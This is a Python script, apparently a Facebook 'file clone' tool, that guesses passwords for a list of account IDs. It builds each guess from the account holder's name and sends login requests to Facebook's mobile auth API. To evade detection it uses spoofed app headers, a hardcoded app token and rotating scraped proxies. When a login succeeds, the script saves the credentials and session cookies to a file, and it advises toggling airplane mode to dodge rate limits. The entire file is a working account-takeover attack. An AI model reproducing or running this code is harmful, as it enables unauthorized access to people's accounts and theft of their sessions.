#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def CEN():
	ua = ['Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;']
	return ua
#__________________LOGO____________#
logo=(f"""
       {G1}███████ {Y}████████ {M}███    ██ {S}█████████
       {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
       {G3}██      {Y}████████ {M}██  █  ██ {S}   ██    
       {G4}██      {Y}██       {M}██   █ ██ {S}   ██    
       {G5}███████ {Y}████████ {M}██    ███ {S}   ██    
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} CENT
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PRIVATE
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONE ')
    print(f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')
    print(f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')
    print(f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')
    linex()
    xen = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if xen in ['1']:
        file()
    elif xen in ['2']:
        os.system('xdg-open https://www.facebook.com/CenT.aep');menu()
    elif xen in ['0']:
        sys.exit()
    else:
        menu()
#__________________FILE DEF____________#
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}CENT.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as CENT:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {tl}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            CENT.submit(M1,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': CEN(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'MOBILE.LTE',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}CEN-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print("\33[0;97m[🍪] : \33[0;97m"+coki)
                open('/sdcard/CENT-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}CEN-PODLOCK{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/CENT-FILE-PODLOCK.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()
   
